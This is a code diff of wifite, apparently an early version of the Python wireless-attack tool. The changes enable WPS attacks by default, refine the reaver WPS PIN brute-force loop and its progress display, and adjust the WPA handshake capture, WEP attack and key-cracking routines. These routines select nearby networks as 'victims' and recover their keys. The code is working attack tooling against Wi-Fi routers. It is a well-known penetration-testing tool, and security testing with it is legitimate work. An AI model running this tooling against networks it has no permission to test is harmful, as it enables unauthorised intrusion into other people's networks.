@@ -5,14 +5,9 @@
 	
 	author: derv82 at gmail
 	
-	FIX:
-	 * Data entry (raw_input) after initial scan requires enter to be pressed TWICE
-	   This is unacceptable. I can't seem to fix it though :( stdin.flush does nothing!
-	
 	TODO:
 	 * WEP - ability to pause/skip/continue	 
-	 * reaver/walsh - integrate
-	 * WPA - crack (aircrack/pyrit/cowpatty)
+	 * WPA - crack (pyrit/cowpatty)
 	 
 	 * Unknown SSID's : Send deauth's (when on fixed channel) to unmask!
 	 
@@ -83,7 +78,7 @@ WEP_FINDINGS        = [] # List of strings containing info on successful WEP att
 # WPS variables
 WPS_ONLY            = False # Target only WPS-enabled routers
 WPS_FINDINGS        = []
-WPS_DISABLE         = True # Flag to disable WPS attacks
+WPS_DISABLE         = False # Flag to disable WPS attacks
 
 # Program variables
 IFACE_TO_TAKE_DOWN = '' # Interface that wifite puts into monitor mode
@@ -231,7 +226,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 		command.append('-c')
 		command.append(str(channel))
 	command.append(iface)
-	proc = Popen(command, stdout=DN, stderr=PIPE)
+	proc = Popen(command, stdout=DN, stderr=DN)
 	
 	time_started = time.time()
 	print ' [+] '+G+'initializing scan'+W+', updates at 5 second intervals, '+G+'CTRL+C'+W+' when ready.'
@@ -243,6 +238,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 				
 				# RTL8187 Unknown Error 132 FIX
 				if proc.poll() != None: # Check if process has finished
+					
 					if not tried_rtl8187_fix and proc.communicate()[1].find('failed: Unknown error 132') != -1:
 						if rtl8187_fix(iface):
 							return scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
@@ -305,7 +301,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 		else: print ''
 	
 	ri = raw_input(" [+] select "+G+"target numbers"+W+" ("+G+"1-%s)" % (str(len(targets))+W) + \
-	                     "separated by commas, or '%s%s%s': %s" % (G, 'all', W, G))
+	                     " separated by commas, or '%s': " % (G+'all'+W))
 	if ri.strip().lower() == 'all':
 		victims = targets[:]
 	else:
@@ -327,6 +323,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 		print O + '[!]' + R + ' no targets selected. exiting'
 		exit_gracefully(0)
 	
+	print ''
 	print ' [+] %s%d%s target%s selected.' % (G, len(victims), W, '' if len(victims) == 1 else 's')
 	
 	return (victims, clients)
@@ -338,7 +335,7 @@ def parse_csv(filename):
 	"""
 	if not os.path.exists(filename): return ([], [])
 	try:
-		f = open(filename)
+		f = open(filename, 'r')
 		lines = f.read().split('\n')
 		f.close()
 	except IOError: return ([], [])
@@ -347,7 +344,7 @@ def parse_csv(filename):
 	targets = []
 	clients = []
 	for line in lines:
-		if line.find('Station MAC,') != -1: hit_clients = True
+		if line.startswith('Station MAC,'): hit_clients = True
 		if line.startswith('BSSID') or line.startswith('Station MAC') or line.strip() == '': continue
 		if not hit_clients: # Access points
 			c = line.split(', ', 13)
@@ -828,7 +825,7 @@ def wpa_get_handshake(iface, target, clients):
 			print R+' [0:00:00] '+O+'unable to capture handshake in time'+W
 	
 	except KeyboardInterrupt: 
-		print R+'\n (^C)'+O+' attack interrupted                                             '+W
+		print R+'\n (^C)'+O+' WPA handshake capture interrupted'+W
 		# If there are more targets to attack, ask what to do next
 		if TARGETS_REMAINING > 0:
 			print "\n %s%d%s target%s remain%s" % (G, TARGETS_REMAINING, W,
@@ -1172,7 +1169,7 @@ def attack_wep(iface, target, clients):
 				return True
 		
 	except KeyboardInterrupt:
-		print R+'\n (^C)'+O+' Interrupted'+W
+		print R+'\n (^C)'+O+' WEP attack interrupted'+W
 	
 	if successful:
 		print '\n [0:00:00] attack completed: '+G+'success!'+W
@@ -1264,13 +1261,15 @@ def main():
 			if c.station == t.bssid:
 				ts_clients.append(c)
 		
+		print ''
 		if t.encryption.find('WPA') != -1:
-			wpa_total += 1
 			need_handshake = True
 			if t.wps:
 				need_handshake = not wps_attack(iface, t)
+				wpa_total += 1
 			
 			if need_handshake:
+				wpa_total += 1
 				if wpa_get_handshake(iface, t, ts_clients):
 					wpa_success += 1
 			else:
@@ -1382,7 +1381,7 @@ def wpa_crack(capfile):
 			             (sec_to_hms(time.time() - start_time), kt, kps),
 			stdout.flush()
 			
-	except KeyboardInterrupt: print R+'\n (^C)'+O+' cracking interrupted'+W
+	except KeyboardInterrupt: print R+'\n (^C)'+O+' WPA cracking interrupted'+W
 	
 	send_interrupt(proc)
 	try: os.kill(proc.pid, SIGTERM)
@@ -1404,16 +1403,19 @@ def wps_attack(iface, target):
 		print C+'        http://code.google.com/p/reaver-wps/'
 		return False
 	
+	print GR+' [0:00:00]'+W+' initializing %sWPS-brute force attack%s against %s' % (G, W, G+target.ssid+W)
+	
 	cmd = ['reaver',
 	       '-i', iface,
 	       '-b', target.bssid,
 	       '-o', temp + 'out.out',
 	       '-a',  # auto-detect best options
-	       '-v']  # semi-verbose output
+	       '-vv']  # semi-verbose output
 	proc = Popen(cmd, stdout=DN, stderr=DN)
 	cracked = False
-	percent = '0.00'
-	aps = '0'
+	percent = 'x.xx'
+	aps = 'x'
+	time_started = time.time()
 	try:
 		while not cracked:
 			time.sleep(1)
@@ -1428,7 +1430,9 @@ def wps_attack(iface, target):
 						i = line.find(' (')
 						j = line.find(' seconds/attempt', i)
 						if i != -1 and j != -1: aps = line[i+2:j]
-				print ' [+] brute-forcing with %s, %s%% (%s tries/sec)    \r' % (G+'reaver'+W, G+percent+W, G+aps+W),
+				print ' %s brute-forcing WPS pin via %s, %s%% (%s tries/sec)    \r' % \
+				            (GR+sec_to_hms(time.time()-time_started)+W, \
+				            G+'reaver'+W, G+percent+W, G+aps+W),
 				stdout.flush()
 			
 			if proc.poll() != None:
@@ -1446,15 +1450,15 @@ def wps_attack(iface, target):
 						key = line[14:-1]
 						cracked = True
 				
-				if pin != '': print '\n [+] PIN found: %s' % (pin)
-				if key != '': print ' [+] WPA key found: "%s"' % (G+key+W)
+				if pin != '': print '\n\n [+] PIN found:     %s' % (G+pin+W)
+				if key != '': print ' [+] %sWPA key found%s: "%s"' % (G, W, C+key+W)
 				break
 		
 		if cracked:
-			WPS_FINDINGS.append("found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, pin))
+			WPA_FINDINGS.append("found %s's WPA key: \"%s\", WPS PIN: %s" % (G+target.ssid+W, C+key+W, pin))
 		
 	except KeyboardInterrupt:
-		print R+'\n (^C)'+O+' interrupted'+W
+		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
 	
 	return cracked
 
@@ -1555,6 +1559,6 @@ if __name__ == '__main__':
 		handle_args()
 		main()
 	except KeyboardInterrupt:
-		print R+'\n (^C)'+O+' Interrupted'+W
+		print R+'\n (^C)'+O+' interrupted'+W
 	exit_gracefully(0)
 
